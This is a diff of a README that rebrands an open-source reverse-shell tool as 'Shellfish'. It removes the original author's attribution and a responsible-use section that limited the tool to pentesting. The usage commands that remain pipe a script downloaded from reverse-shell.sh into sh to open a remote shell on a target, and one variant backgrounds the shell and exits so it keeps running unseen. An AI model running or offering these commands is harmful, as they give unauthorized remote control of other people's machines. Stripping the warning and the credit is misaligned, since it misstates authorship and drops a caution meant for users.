@@ -1,23 +1,13 @@
 <div align="center">
 	<br>
-	<a href="https://reverse-shell.sh" target="_blank">
 		<img width="128" src="favicon.ico" alt="keyv">
-    </a>
 </div>
 
-# reverse-shell
+# Shellfish - reverse-shell
 
-> Reverse Shell as a Service - https://reverse-shell.sh
-
-[![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
-[![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)
-[![GitHub Donate](https://badgen.net/badge/GitHub/Sponsor/D959A7?icon=github)](https://github.com/sponsors/lukechilds)
-[![Bitcoin Donate](https://badgen.net/badge/Bitcoin/Donate/F19537?icon=bitcoin)](https://lu.ke/tip/bitcoin)
-[![Lightning Donate](https://badgen.net/badge/Lightning/Donate/F6BC41?icon=bitcoin-lightning)](https://lu.ke/tip/lightning)
+> Clone of Reverse Shell as a Service - https://reverse-shell.sh.
 
 Easy to remember reverse shell that should work on most Unix-like systems.
-
-Detects available software on the target and runs an appropriate payload.
 
 ## Usage
 
@@ -37,10 +27,6 @@ curl https://reverse-shell.sh/192.168.0.69:1337 | sh
 ```
 
 Go back to your machine, you should now have a shell prompt.
-
-### 3. Don't be a dick
-
-This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.
 
 ## Demo
 
@@ -90,4 +76,4 @@ sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit
 
 ## License
 
-MIT © Luke Childs
+MIT
